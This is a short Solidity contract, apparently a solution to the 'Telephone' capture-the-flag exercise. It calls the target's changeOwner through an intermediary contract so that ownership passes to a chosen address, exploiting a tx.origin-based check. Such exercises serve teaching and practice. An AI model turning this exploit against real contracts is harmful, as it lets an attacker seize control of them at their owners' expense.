pragma solidity ^0.4.18;

import './telephone.sol';

contract HackTelephone {

  Telephone private tele;

  // address contract Telephone
  function HackTelephone(address contractAddress) public {
    tele = Telephone(contractAddress);
  }

  function hack(address _owner) public {
    tele.changeOwner(_owner);
  }
}